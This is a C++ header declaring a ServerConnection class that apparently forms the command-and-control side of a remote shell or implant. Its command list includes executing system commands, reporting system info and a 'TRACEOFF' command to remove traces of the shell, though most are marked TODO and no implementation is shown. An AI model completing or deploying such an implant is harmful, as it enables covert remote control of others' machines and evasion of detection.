#pragma once
#include <iostream>
#include <time.h>

#include "HTTPRequest.hpp"
#include "ConnectionHandler.h"
#include "Log.h"

#define COMMAND_TYPE_LEN 4

class ServerConnection : public ConnectionHandler
{
	enum commands
	{
		EXEC,          // System Command for Executing (TODO)
		EXIT,         // Kill Process (TODO)
		INFO,        // Get Stored System Info (TODO)
		ECHO,       // Echo Request
		TRACEOFF,  // Remove Any Trace for This Shell (TODO)
		UNKNOWN   // Unknown Command Type
	};

	typedef struct Request
	{
		std::string sessionId;
		enum commands commandType;
		std::string params;
	} Request;

	typedef struct Response
	{
		std::string sessionId;
		std::string content;
	} Response;

	static std::string _serverAddress;
	std::string extractSessionId(http::Response request);
	enum ServerConnection::commands extractCommandType(http::Response request);
	std::string extractParameters(http::Response request);
	ServerConnection::Request* parsingRequest(http::Response request);
	ServerConnection::Response handleRequest(ServerConnection::Request* request);

public:
	ConnectionHandler* run(void);
};